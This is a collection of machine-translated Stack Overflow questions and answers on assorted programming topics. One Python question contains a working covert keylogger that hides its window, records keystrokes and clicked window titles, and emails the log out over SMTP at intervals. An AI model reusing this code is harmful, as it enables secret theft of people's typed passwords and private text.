    try {
        List<Address> addresses = geocoder.getFromLocation(lat, lng, 1);
   } catch (IOException e) {
         TODO Auto-generated catch block
        e.printStackTrace();
        Toast.makeText(this,e.getMessage(),Toast.LENGTH_SHORT).show();
    }
}
@Override
public void onLocationChanged(Location location) {
}
@Override
public void onStatusChanged(String provider, int status, Bundle extras) {
}
@Override
public void onProviderEnabled(String provider) {
}
@Override
public void onProviderDisabled(String provider) {
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2017-07-18T11:38:15.880

您不能在一张谷歌地图中为两件事制作动画（例如放大并转到我的位置）。
所以使用移动和动画相机来缩放

```
googleMapVar.moveCamera(CameraUpdateFactory.newLatLng(LocLtdLgdVar));
googleMapVar.animateCamera(CameraUpdateFactory.zoomTo(10)); 
```

* * *

## 回答 #11

> 赞同：-2
> 
> 时间：2013-05-30T06:05:20.627

```
gmap.animateCamera(CameraUpdateFactory.newCameraPosition(new CameraPosition(new LatLng(9.491327, 76.571404), 10, 30, 0))); 
```

# php - PHP Regex：提取文件名中的最后一个数字

> ID：14074131
> 
> 赞同：4
> 
> 时间：2012-12-28T18:37:41.527
> 
> 标签：php, regex

我需要一个正则表达式来提取一个数字，该数字始终位于包含在 () 中的文件的末尾。

例如：

> 假期 (1).png**返回 1**
> 
> 假期（我和妈妈） (2).png**返回 2**
> 
> 假期 (5) (3).png**返回 3**

希望一些正则表达式专家在那里:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T18:39:47.683

应该这样做（[ideone.com 上的演示](http://ideone.com/P1sFZT)）：

```
preg_match( '/^.*\((\d+)\)/s', $filename, $matches );
$number = $matches[1]; 
```

贪婪`^.*`导致正则表达式首先匹配尽可能多的字符，然后回溯直到它可以匹配`\((\d+)\)`，即用括号括起来的数字。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-28T18:47:16.753

就这么写吧，`$`就是主题的结尾：

```
$pattern = '/\((\d+)\)\.png$/';
$number  = preg_match($pattern, $subject, $matches) ? $matches[1] : NULL; 
```

这是一种所谓的锚定模式，它工作得很好，因为正则表达式引擎知道从哪里开始 - 在这里结束。

这个疯狂模式的其余部分只是引用所有需要引用的字符：

```
(, ) and . => \(, \) and \. in:

().png     => \(\)\.png 
```

然后将一组匹配项放入其中，仅包含一个或多个 ( `+`) 数字`\d`：

```
\((\d+)\)\.png
  ^^^^^ 
```

最后要让这个工作，添加`$`标记结束：

```
\((\d+)\)\.png$
              ^ 
```

准备运行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T18:48:05.413

把事情简单化。使用[preg_match_all](http://php.net/preg_match_all)

```
preg_match_all('/\((\d+)\)/', $filename, $m); 
$num=end(end($m)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-28T18:58:06.097

```
<?php
    $pattern = '/(.+)\((\d+)\)\.png/';
    $test1 = "Vacation LDJFDF(1).png";
    $test2 = "Vacation (Me and Mom) (2).png";
    $test3 = "Vacation (5)(3).png";

    preg_match($pattern, $test1, $matches);
    print $matches[2];
    print "\n";

    preg_match($pattern, $test2, $matches);
    print $matches[2];
    print "\n";

    preg_match($pattern, $test3, $matches);
    print $matches[2];
    print "\n";

?> 
```

php test.php 1 2 3

# python - APScheduler 问题

> ID：14074132
> 
> 赞同：0
> 
> 时间：2012-12-28T18:37:46.840
> 
> 标签：python, email, logging, pyhook

我正在使用 pyHook 来挂钩我的计算机的密钥并创建这些密钥的日志。现在，我正在尝试以间隔发送此日志，但我得到的是：No handlers could be found for logger "apscheduler.scheduler"

这是我的代码，我该怎么办？

```
import win32api
import win32console
import win32gui
import pythoncom, pyHook
import smtplib
from apscheduler.scheduler import Scheduler

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

log = ""
logpath = "log.txt"

openfile = open(logpath,"w")
openfile.write("")

sched = Scheduler()
sched.start()

def sendEmail():
    print("ready to send email")
    fromaddr = 'XXX@gmail.com'
    toaddrs  = 'XXX@gmail.com'
    msg = open('log.txt',"r").read()

    username = 'XXX'
    password = 'XXX'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr, toaddrs, msg)
    server.quit()
    print("mail sent")

def OnKeyboardEvent(event):
    try:
        global log
        if event.Alt == 32 and event.KeyID == 160:
            log = "[LangCh]"
        elif event.KeyID>=37 and event.KeyID<=40:
            log = "["+event.Key+"]"
        elif event.Ascii == 8:
            log = "[BS]"
        elif event.Ascii == 9:
            log = "[TAB]"
        elif event.Ascii == 13:
            log = "[NL]"
        elif event.Ascii == 27:
            log = "[ESC]"
        elif event.Alt == 32 and event.KeyID == 75:
            openfile.close()
            sendEmail()
            exit()
        else:
            log = chr(event.Ascii)
        openfile.write(log)
    except:
        pass
    return True

def OnMouseEvent(event):
    global log
    if event.MessageName == "mouse left down":
        log = "<"+event.WindowName +">\n"
        openfile.write(log)
    if event.MessageName == "mouse left up" and event.WindowName == None :
        log = "-\n"
        openfile.write(log)
    return True

def email():
    openfile.close()
    sendEmail()
    openfile = open(logpath,"w")

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm2 = pyHook.HookManager()
hm2.MouseAll = OnMouseEvent
hm.HookKeyboard()
hm2.HookMouse()

sched.add_interval_job(email,seconds=20)

pythoncom.PumpMessages() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-18T06:19:49.360

通常我会添加这个：
`logging.basicConfig(`
`filename=''.join([getcwd(), '/', 'log_file_name.log']),`
`level=logging.DEBUG,`
`format='%(levelname)s[%(asctime)s]: %(message)s'`
`)`

您可以参考问题[How to specify 'logger' for apscheduler](https://stackoverflow.com/questions/12888977/how-to-specify-logger-for-apscheduler)

# javascript - 在通过终端监视这些日志的同时记录到文件（格式很好）

> ID：14074135
> 
> 赞同：0
> 
> 时间：2012-12-28T18:37:59.727
> 
> 标签：javascript, node.js, logging, terminal, jake

我试图找出改善从正在运行的 jake 任务记录到终端的消息的最佳方法。

我希望能够通过终端显示格式良好的消息，不仅是正在运行的服务器，还有可能正在运行的任何其他任务（包括从其他任务调用）。例如，假设我`jake run`在开发时执行让服务器运行，这也会调用`jake watch`监视我的 less css 文件以进行更改的任务。它还可以调用`jake unit`（上面的示例中未显示）以连续运行单元测试等......

我认为将记录器记录到文件（例如）并简单地从该任务`./dev.log`中运行某种类型的文件是有意义的（现在拥有文件日志的额外好处。如果这是一种合理的方法，那么：`tail -f``jake run`

*   如何使用终端颜色登录？和
*   如何监视和流式传输`./dev.log`正在运行的任务/终端的内容？

如果没有，并且您有更好的建议，您能否指出我正确的方向？如果并且一旦实施，我将在这里分享解决方案。

谢谢！

### 示例代码

```
var servers = [
    {
        root: 'application',
        port: 8000
    },
    {
        root: 'dist',
        port: 8001
    }
];

// jake run
desc('Run when coding. (Watches files, compiles less, runs dev server, runs test, etc)');
task('run', {async: true}, function () {
    jake.Task.watch.invoke(); // invoking the 'watch' teask which I keep separate
    jake.logger.log('Starting static web servers:'); // simple logging through jake (this is what I'm trying to replace)
    var connect = require('connect');
    servers.forEach(function (server) {
        jake.logger.log('localhost:' + server.port + ' -> ' + server.root);
        connect(connect['static'](server.root)).listen(server.port);
    });
});

desc('Watches for changes to the main .less file');
task('watch', function () {
    var gaze = require('gaze');
    gaze(['application/css/style.less'], function (err, watcher) {
        this.on('all', function (event, filepath) {

            var fs = require('fs');
            var less = require('./node_modules/less/lib/less');
            var parser = new (less.Parser)({
                paths: ['./application/css'], // Specify search paths for @import directives
                filename: 'style.less'
            });
            parser.parse(fs.readFileSync('./application/css/style.less', 'utf8'), function (err, tree) {
                if (err) {
                    return console.error(err);
                    // TODO log error
                } else {
                    fs.writeFileSync('./application/css/style.css', tree.toCSS({ compress: true }));
                    jake.logger.log('application/css/style.less > application/css/style.css');
                    complete();
                    // TODO log success
                }
            });

        });
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T21:21:58.073

找到了一种解决方案：[https ://github.com/flatiron/winston](https://github.com/flatiron/winston)

```
var colors = require('colors'); // in case I want to use color in messages
var winston = require('winston');
var logger = new (winston.Logger)({
    exitOnError: false,
    transports: [
        new (winston.transports.Console)({
            colorize: true,
            handleExceptions: true
        })
    ]
});
logger.cli(); 
```

然后在我的任务中：

```
logger.info('application/css/style.less > application/css/style.css'); 
```

或者

```
logger.error("[" + err.type + "] [" + err.filename + ":" + err.line + "," + err.column + "]: " + err.message); 
```

这对我来说很好。如果我可以将格式化程序函数传递给记录器会更好，这样我就可以避免一遍又一遍地使用颜色但没什么大不了的。

不管怎么说，多谢拉！

# java - Java如何从udp数据包中的Sint64解析UTC

> ID：14074136
> 
> 赞同：0
> 
> 时间：2012-12-28T18:38:00.147
> 
> 标签：java, bit-manipulation, utc

我有一个 UDP 数据包进来，其中包含 Sint64 形式的 UTC。如何将其转换为 UTC 时间？

Sint64 = 8 bytes 我在下面分配了 8 个字节数组。这是进入“receivedData”字节数组的唯一内容

```
 DatagramSocket serverSocket = new DatagramSocket(18000);
    byte[] receiveData = new byte[8];

    while (true)
    {
        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
        serverSocket.receive(receivePacket);

       //not sure how I should be reading the raw binary data back into UTC object

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:00:55.757

首先，您需要将字节数组转换为`long`（64位有符号整数）：

```
ByteBuffer buf = ByteBuffer.wrap(receiveData);
long utcTime = buf.getLong(); 
```

此代码假定 64 位值以处理器用于运行应用程序的相同字节顺序（小端与大端）存储。

您没有指定 64 位值到底是什么。我假设它是自 1970 年 1 月 1 日 0:00 UTC 以来的毫秒数。

因此，要构建日期，请使用以下代码：

```
Date dateTime = new Date(utcTime); 
```

如果您有不同的零点或不同的单位，则需要相应地进行调整。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-28T21:15:15.083

UDP 使用网络字节顺序，即 Big Endian。x86 使用 little endian，因此上面的 bytebuff 示例在 x86 上会失败，因为它不知道 long 来自网络。

```
 return (((long)readBuffer[0] << 56) +
                ((long)(readBuffer[1] & 255) << 48) +
                ((long)(readBuffer[2] & 255) << 40) +
                ((long)(readBuffer[3] & 255) << 32) +
                ((long)(readBuffer[4] & 255) << 24) +
                ((readBuffer[5] & 255) << 16) +
                ((readBuffer[6] & 255) <<  8) +
                ((readBuffer[7] & 255) <<  0)); 
```

或者

```
return (((long)in.read() << 56) +
                ((long)(in.read() & 255) << 48) +
                ((long)(in.read() & 255) << 40) +
                ((long)(in.read() & 255) << 32) +
                ((long)(in.read() & 255) << 24) +
                ((in.read() & 255) << 16) +
                ((in.read() & 255) <<  8) +
                ((in.read() & 255) <<  0)); 
```

应该可以解决问题（从缓冲区/流中读取 Big Endian）。

# javascript - 我在哪里定义实例 ID 以开始？

> ID：14074137
> 
> 赞同：2
> 
> 时间：2012-12-28T18:38:07.687
> 
> 标签：javascript, node.js, amazon-ec2

我还没有找到答案，我已经尝试将我想要关闭/打开的实例 ID：

```
ec2 = aws.createEC2Client(yourAccessKeyId, yourSecretAccessKey);

ec2.call("StartInstances", {}, function(err, result) {
  console.log(result);
}) 
```

我需要在该脚本的哪个位置定义我要启动的实例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-27T08:20:06.627

正如乔在他的评论中指出的那样，接受一个必须具有属性`startInstances`的对象参数。在适用于 Node.js 的 AWS 开发工具包的[文档](http://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/EC2_20130201.html#startInstances-property)中查看更多信息。`param``InstanceIds`

# php - 不知何故 $_SERVER['REMOTE_ADDR'] 没有给我这个用 户的 IP 地址..？

> ID：14074146
> 
> 赞同：1
> 
> 时间：2012-12-28T18:38:42.193
> 
> 标签：php

我的网站上有一个基本申请表，用于`$_SERVER['REMOTE_ADDR']`包含提交表单的用户的 IP 地址。

我在表单处理器脚本中使用以下内容。

```
// Create database object and connect to database.
$db = new Database($db_host, $db_username, $db_password, $db_name);
$db->connect();

// Collect POST data
$merchant_data['ip_address'] = $_SERVER['REMOTE_ADDR'];
$merchant_data['first_name'] = isset($_POST['first_name']) ? $_POST['first_name'] : '';
$merchant_data['last_name'] = isset($_POST['last_name']) ? $_POST['last_name'] : '';
$merchant_data['email_address'] = isset($_POST['email']) ? $_POST['email'] : '';
$merchant_data['phone_number'] = isset($_POST['phone']) ? $_POST['phone'] : '';
$merchant_data['customer_notes'] = isset($_POST['comments']) ? $_POST['comments'] : '';
$merchant_data['plan_name'] = isset($_POST['plan_name']) ? $_POST['plan_name'] : '';
$merchant_data['estimated_monthly_volume'] = $_SESSION['estimated_monthly_volume']; 
$merchant_data['interested_in'] = isset($_POST['interested_in']) ? $_POST['interested_in'] : '';
$merchant_data['additional_equipment_interest'] = isset($_POST['additional_equipment_interest']) ? serialize($_POST['additional_equipment_interest']) : '';
$additional_equipment_interest = isset($_POST['additional_equipment_interest']) ? $_POST['additional_equipment_interest'] : array();
$merchant_data['website_id'] = 1;

// Add new record in database.
$merchant_app_record_id = $db->query_insert('merchant_account_applications',$merchant_data);

// Close database connection
$db->close(); 
```

最近有人对这个表单进行了一些垃圾邮件点击，但不知何故，这个用户的 IP 地址没有登录到我的系统中。

但是，通过的每个其他用户最终都会记录 IP 地址。

这个人可以做些什么来使我的网站无法获取他们的 IP 地址？我想禁止他们的IP，但我不能得到它。

任何有关如何获取其 IP 或以其他方式禁止特定用户的信息将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-15T05:24:44.130

使用这个：[https ://gist.github.com/cballou/2201933](https://gist.github.com/cballou/2201933)

这适用于我的博客网站。我不知道为什么 $_SERVER['REMOTE_ADDR'] 不能处理这个问题，但是 github 中的代码片段效果很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:47:05.333

当用户使用代理（他自己设置的）时发生了这种情况 - 而不是 IP 地址，我得到了类似“neil@mars”的东西，因为这是他在代理中配置的。

此外

```
$_SERVER['REMOTE_ADDR'] 
```

你可以试试

```
getenv('HTTP_X_FORWARDED_FOR')
getenv('HTTP_CLIENT_IP') 
```

# c# - 将事件绑定到命令

> ID：14074148
> 
> 赞同：3
> 
> 时间：2012-12-28T18:38:49.287
> 
> 标签：c#, wpf, mvvm

如果不使用第三方 DLL，是否可以将 CellEditEnding 事件绑定到我的命令？目前，我使用的是 .NET 3.5，这已成为一个问题，因为它告诉我无法将 EventTrigger 添加到 Trigger 集合中。

```
<i:Interaction.Triggers>
    <i:EventTrigger EventName="CellEditEnding">
        <i:InvokeCommandAction CommandName="EnterUserCountCommand" />
    </i:EventTrigger>
</i:Interaction.Triggers> 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:42:05.683

不确定这是否是最好的解决方案，但是当我遇到这种情况时，我通常会做这样的事情。

```
private void CellEditEndingEvent(object sender, RoutedEventArgs e)
{
    var viewModel = (MyViewModel)DataContext;
    //Change params as needed
    if (viewModel.MyCommand.CanExecute(null))
        viewModel.MyCommand.Execute(null);
} 
```

# python - 带有 application/x-www-form-urlencoded 的 Tastypie

> ID：14074149
> 
> 赞同：6
> 
> 时间：2012-12-28T18:38:49.777
> 
> 标签：python, django, tastypie

我有点难以弄清楚我的下一步应该是什么。我正在使用tastepie 为我的Web 应用程序创建一个API。

从另一个应用程序，特别是 ifbyphone.com，我收到一个没有标题的 POST，看起来像这样：

```
post data:http://myapp.com/api/
callerid=1&someid=2&number=3&result=Answered&phoneid=4 
```

现在，我在我的服务器日志中看到这正在击中我的服务器。但美味派抱怨 POST 的格式。

> {“error_message”：“指示的格式 'application/x-www-form-urlencoded' 没有可用的反序列化方法。请检查您的`formats`和`content_types`在您的序列化器上。”，“traceback”：“回溯（最近一次调用最后一次）：\ n\n 文件\"/usr/local/lib/python2.7/dist-packages/tastypie/resources.py\"

当我尝试使用 curl 发布原始数据时，我也会收到相同的消息，我“相信”这与 ifbyphone 的 POST 方法使用的基本过程相同：

```
curl -X POST --data 'callerid=1&someid=2&number=3&duration=4&phoneid=5' http://myapp.com/api/ 
```

所以，假设我的问题实际上是错误消息中指定的，并且没有反序列化方法，我将如何编写一个？

### ＃＃＃＃ 更新 ＃＃＃＃＃＃

在此提交的一些帮助下（[https://github.com/toastdriven/django-tastypie/commit/7c5ea699ff6a5e8ba0788f23446fa3ac31f1b8bf](https://github.com/toastdriven/django-tastypie/commit/7c5ea699ff6a5e8ba0788f23446fa3ac31f1b8bf)）我一直在尝试编写自己的序列化程序，从文档中复制基本框架（[https://django -tastypie.readthedocs.org/en/latest/serialization.html#implementing-your-own-serializer](https://django-tastypie.readthedocs.org/en/latest/serialization.html#implementing-your-own-serializer)）

```
import urlparse
from tastypie.serializers import Serializer

class urlencodeSerializer(Serializer):
    formats = ['json', 'jsonp', 'xml', 'yaml', 'html', 'plist', 'urlencode']
    content_types = {
        'json': 'application/json',
        'jsonp': 'text/javascript',
        'xml': 'application/xml',
        'yaml': 'text/yaml',
        'html': 'text/html',
        'plist': 'application/x-plist',
        'urlencode': 'application/x-www-form-urlencoded',
        }
    def from_urlencode(self, data,options=None):
        """ handles basic formencoded url posts """
        qs = dict((k, v if len(v)>1 else v[0] )
            for k, v in urlparse.parse_qs(data).iteritems())
        return qs

    def to_urlencode(self,content): 
        pass 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-28T20:34:20.050

当我编辑资源模型以实际使用我创建的序列化程序类时，这按预期工作。这在文档中并不清楚。

```
class urlencodeSerializer(Serializer):
    formats = ['json', 'jsonp', 'xml', 'yaml', 'html', 'plist', 'urlencode']
    content_types = {
        'json': 'application/json',
        'jsonp': 'text/javascript',
        'xml': 'application/xml',
        'yaml': 'text/yaml',
        'html': 'text/html',
        'plist': 'application/x-plist',
        'urlencode': 'application/x-www-form-urlencoded',
        }
    def from_urlencode(self, data,options=None):
        """ handles basic formencoded url posts """
        qs = dict((k, v if len(v)>1 else v[0] )
            for k, v in urlparse.parse_qs(data).iteritems())
        return qs

    def to_urlencode(self,content): 
        pass

MyModelResource(ModelResoucre):
    class Meta:
        ...
        serializer = urlencodeSerializer() # IMPORTANT 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-28T00:21:44.717

我将对 Brandon Bertelsen 的帖子中提到的 from_urlencode 添加一个修改，以更好地处理国际字符：

```
def from_urlencode(self, data, options=None):
    """ handles basic formencoded url posts """
    qs = {}
    for k, v in urlparse.parse_qs(data).iteritems():
        value = v if len(v)>1 else v[0]
        value = value.encode("latin-1").decode('utf-8')
        qs[k] = value
    return qs 
```

我不确定这是否是因为我这边的环境原因，但是我发现在使用以下字符串“ÁáÄäÅåÉéÍíÑñÓóÖöÚúÜü”和原始函数时，我遇到了一些问题。

当这个字符串被 URL 编码时，它变成：“%C3%81%C3%A1%C3%84%C3%A4%C3%85%C3%A5%C3%89%C3%A9%C3%8D%C3 %AD%C3%91%C3%B1%C3%93%C3%B3%C3%96%C3%B6%C3%9A%C3%BA%C3%9C%C3%BC"

当这得到 URL 解码时，我们有： u'\xc3\x81\xc3\xa1\xc3\x84\xc3\xa4\xc3\x85\xc3\xa5\xc3\x89\xc3\xa9\xc3\x8d\xc3\ xad\xc3\x91\xc3\xb1\xc3\x93\xc3\xb3\xc3\x96\xc3\xb6\xc3\x9a\xc3\xba\xc3\x9c\xc3\xbc'

这里的问题是这个字符串看起来是 unicode，但实际上不是，所以上面的字符串被转换为：“ÃÃ¡ÃÃ¤ÃÃ¥ÃÃ©ÃÃÃÃÃ±ÃÃ³ÃÃ”

我发现如果我将 URL 解码值解释为 latin-1，然后将其解码为 UTF-8，我得到了正确的原始字符串。

# xcode - 如何用文本字符串添加 [NSArray arrayWithObjects NSNumber numberWithInt:]？

> ID：14074155
> 
> 赞同：2
> 
> 时间：2012-12-28T18:39:22.040
> 
> 标签：xcode, text, nsarray, nsnumber

如何在 NSNumber 中添加文本？我找不到解决此问题的解决方案。你这是怎么做到的？

```
NSString *myInt = interestRate.text;

NSArray *vals = [NSArray arrayWithObjects:
                 [NSNumber numberWithInt:30],
                 [NSNumber numberWithInt: [NSString stringWithFormat:@"%@", myInt]],
                 [NSNumber numberWithInt:20],
                 [NSNumber numberWithInt:56],
                 [NSNumber numberWithInt:70],
                 [NSNumber numberWithInt:34],
                 [NSNumber numberWithInt:43],
                 nil]; 
```

我在为每一个添加文本时遇到问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T18:41:46.990

利用：

```
NSString *myInt = interestRate.text;

NSArray *vals = [NSArray arrayWithObjects:
                 [NSNumber numberWithInt:30],
                 [NSNumber numberWithInt:[myInt intValue]],
                 [NSNumber numberWithInt:20],
                 [NSNumber numberWithInt:56],
                 [NSNumber numberWithInt:70],
                 [NSNumber numberWithInt:34],
                 [NSNumber numberWithInt:43],
                 nil]; 
```

# ruby-on-rails - 如何禁用特定邮件的布局？

> ID：14074160
> 
> 赞同：3
> 
> 时间：2012-12-28T18:39:51.660
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.2, actionmailer

我需要能够禁用特定电子邮件的特定布局。我已经查看了[Rails for ActionMailer - How to disable a Layout for a certain mailer](https://stackoverflow.com/questions/5214738/rails-for-actionmailer-how-to-disable-a-layout-for-a-certain-mailer)但是我不知道在哪里以及如何输出必要的代码。我是 Ruby 新手，已经搜索了 API 文档，但找不到我需要的确切代码行。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T18:46:41.550

```
class YourMailer

  layout false, only: [:mail_method1, :mail_method2]

  def mail_method1
    #your code
  end 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-02-12T16:05:55.530

您可以粗略地在 mail() 调用之前简单地执行此操作：

```
@_action_has_layout = false 
```

# javascript - 在添加到 DOM 时触发 Javascript 事件

> ID：14074161
> 
> 赞同：12
> 
> 时间：2012-12-28T18:39:55.627
> 
> 标签：javascript, dom, dom-events

有谁知道在将元素添加到 DOM 后如何触发 Javascript 中的事件？

一般的想法是这样的：

```
var elem = document.createElement('div');
elem.addEventListener('ON_ADD_TO_BODY', function(){console.log(elem.parentNode)});
//... LATER ON ...
parentElemInBody.appendChild(elem); // <- Event is triggered here after append 
```

在将元素添加到 DOM 之前，有些函数不应该被触发，因此延迟执行直到元素被添加是有意义的。

有没有办法做到这一点而无需稍后明确调用它们，或者我应该做一些包括 a`setTimeout`和检查以查看元素是否已添加到 DOM 的 hack？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-28T18:40:39.727

使用**DOMNodeInserted**突变事件。

此处的文档：[https ://developer.mozilla.org/en-US/docs/DOM/Mutation_events](https://developer.mozilla.org/en-US/docs/DOM/Mutation_events)

上页给出的示例用法：

```
element.addEventListener("DOMNodeInserted", function (ev) {
  // ...
}, false); 
```

**注：2016 年 4 月 17 日**

突变事件目前已被弃用。现在推荐的方法是 [Mutation Observers](https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver)。

# android - 如何将 Android 应用程序与 Google Voice Command 集成

> ID：14074164
> 
> 赞同：4
> 
> 时间：2012-12-28T18:40:08.227
> 
> 标签：android

作为 Nexus 7 的新用户，我喜欢 Google Voice Action 与他们的时钟应用程序集成来创建闹钟，因为我一直使用它来“提醒我在晚上 8:00 倒垃圾”（例如）。然而，我希望它没有做的一件事是提供一个小部件，显示所有活动警报的列表，包括描述和时间/日期。

为此，我想创建我自己的警报应用程序来做到这一点。我是一位经验丰富的 Android 开发人员，但我完全不熟悉 Google Voice Action API，所以我不确定从哪里开始。对该主题的搜索将我带到了 Android 开发者博客，其中有一篇关于它与音乐应用程序的使用的条目，但在我正在研究的领域中没有任何内容。

我需要了解 API 的两个主题 - 如何使用语音操作注册我的应用程序以处理“提醒我”操作（因此在收到命令时它会与任何其他待办事项应用程序一起弹出），以及如何解析从语音操作到应用程序的实际语音命令（因此在上面的示例中，它将“取出垃圾”和“晚上 8:00”作为值传递回应用程序）。谁能指出我从哪里开始的正确方向？

谢谢！

# ruby - 从二进制数据中提取以零结尾的字符串，可能使用 Ruby 的 string.unpack？

> ID：14074165
> 
> 赞同：-1
> 
> 时间：2012-12-28T18:40:12.190
> 
> 标签：ruby, binary-data

我通过 Ruby 向服务器执行 UDP 请求。服务器的响应是混合内容，这意味着我得到字符串、数字等。我知道如何解释响应，但我遇到了字符串问题，因为它们的长度可能会有所不同。所有字符串都以零结尾。

字符串可以如下所示：

```
[84, 104, 101, 32, 83, 116, 114, 101, 97, 109, 33, 32, 50, 52, 47, 55,
32, 66, 97, 100, 119, 97, 116, 101, 114, 32, 91, 65, 108, 108, 116,
97, 108, 107, 93, 0] 
```

它以 UTF8 编码，代表`The Stream! 24/7 Badwater [Alltalk]`.

如前所述，响应中有更多字节，而不仅仅是像上面那样的单个字符串。所有固定长度的内容都可以很容易地用 获取`string.unpack`，但我不知道如何提取字符串。我必须手动解析字节流还是有办法可以继续使用`string.unpack`？

编辑：

整个响应如下所示： http: [//paste.org/59395](http://paste.org/59395)

协议详情：[http ://tinyurl.com/bvyepsl](http://tinyurl.com/bvyepsl)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:34:31.990

哦，我看不到树木的树林，对不起。

您可以使用以下方法轻松提取以零结尾的字符串`a_string.unpack("Z*")`

# javascript - 为什么修改全局变量会增加 Chrome 中的内存使用量

> ID：14074176
> 
> 赞同：8
> 
> 时间：2012-12-28T18:40:52.990
> 
> 标签：javascript, html, optimization, memory, webkit

最近我一直在优化 javascript 代码以制作 HTML5 游戏，尤其是针对移动浏览器。我从比较引擎开始，逐渐简化比较的代码，我得到了一些我不明白的东西。

案例是我注意到在 Chrome 中（所以我猜是所有基于 webkit 的浏览器）修改全局变量会导致使用的内存增加。让我给你看两个例子：

**1）修改全局变量：**

代码：

```
var globalVariable = 0;

var fps = 60;
window.onload = init;

function init () {
   setInterval (loop, 1000/fps);   
};

function loop (){

    for (var i = 0; i < 1000000; i++) {
     globalVariable =  Math.random();
    }
}; 
```

记忆时间线屏幕：![记忆1](../Images/c695beea954d9bec619ed9498a6d70b2.png)

如您所见，它在前 10 秒内需要收集大量内存！

**2）创建局部变量而不是修改全局变量：**

代码保持不变，唯一的变化是在循环中添加关键字“var”。globalVariable = Math.random(); 变为 var localVariable = Math.random();

记忆时间线屏幕：![记忆 2](../Images/e8643687d0092d886c89421581b2a6aa.png)

如您所见，内存使用量非常低，前 10 秒仅增加了约 0.1MB。

差别真的很大！我现在无法检查它，但我被告知在两个示例中的 Firefox 中，两种情况的内存使用情况几乎相同。

任何人都可以解释我，或指出我解释它的资源吗？或者任何人都可以建议我如何修改全局变量以不增加使用的内存？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-30T06:53:19.683

（首先，关于“全局”变量的快速咆哮。Javascript 中没有全局变量，有范围，包括窗口级范围）

但是，答案是在 Javascript 函数中从另一个*作用域*访问变量会将其提升到当前作用域。[这是一个有趣的效果解释。](http://mrale.ph/blog/2012/09/23/grokking-v8-closures-for-fun.html)

# jquery - kendoDropDownList 与 jquery.validate.js 冲突

> ID：14074184
> 
> 赞同：1
> 
> 时间：2012-12-28T18:41:27.293
> 
> 标签：jquery, kendo-ui

尝试将 Kendo UI 与本机 MVC 验证一起使用，但如果我仅包含**jquery.validate.js**，则 Kendo UI DropDownList 无法正常工作。它会下拉，但我不能再选择任何东西了。任何解决方法或我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T09:04:17.560

尝试使用 Kendo DropDownListFor，它将与您可能期望的模型的验证属性一起使用。

# elasticsearch - Elasticsearch 获取父字段

> ID：14074185
> 
> 赞同：0
> 
> 时间：2012-12-28T18:41:27.590
> 
> 标签：elasticsearch, elastica

在我的索引中，我有两种类型的广告和产品，

产品 ：

```
_index: fadel
_type: product
_id: 103|2
_version: 1
_score: 1
_source: {
code: 35569058
manufacturer: Packard Bell
tax_class_id: [ ]
visibility: 4
price: [ ]
in_stock: 1
.....
.... 
```

广告

```
_index: fadel
_type: ads
_id: 92
_version: 1
_score: 1
_source: {
customer_id: 2
ads_id: 92
product_id: 28
price_current: 1200.0000
is_pro_customer: 0
state: 13
qty_current: 19
}
fields: {
_parent: 28|2
} 
```

那么如何获取产品的所有广告，以及如何将相关产品检索到广告

PS : 1 个产品可能有一个或多个广告，但一个广告与 1 个产品相关联

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T14:45:03.590

该`_parent`字段被索引和存储，因此您可以将其用作任何其他字段。例如，您可以使用`_parent`字段搜索以检索给定产品的所有广告，或者您可以检索`_parent`字段中的值存储并使用[Get](http://www.elasticsearch.org/guide/reference/api/get.html)操作来检索产品。

# php - php (for+if) vs SQL 子句中的性能影响过滤器/顺序/限制数组

> ID：14074187
> 
> 赞同：4
> 
> 时间：2012-12-28T18:41:44.870
> 
> 标签：php, mysql

我正在使用[wordpress](http://wordpress.org/)，它有一个很好的[数据库](http://codex.wordpress.org/Class_Reference/WP_Query) [界面](http://codex.wordpress.org/Function_Reference/query_posts)，做很多简单的查询非常有用。

我想使用这个界面，但它不允许我做一些特殊的过滤。然后我想我可以从数据库中返回一个结果集，然后使用带有嵌套 if 的 php for 进行过滤，取出我不想要的结果。

我正在考虑为订购做同样的事情。

我知道如果我有索引（在 PHP 中我不能将它们用于数组，但在 mysql 中我有）过滤器（WHERE）和排序等操作与顺序相比非常快。

我在考虑 php_mysql 适配器的性能，我不知道它是否使用延迟加载数据、游标以及将数据从数据库传递到 php 时的内存影响。

另一种用途是限制/计数，在生成分页链接的常见情况下，需要有限的数据，但也需要总计数。有两个选项可以做到这一点：

*   使用两个查询：一个用于计数，一个用于限制和实际数据。
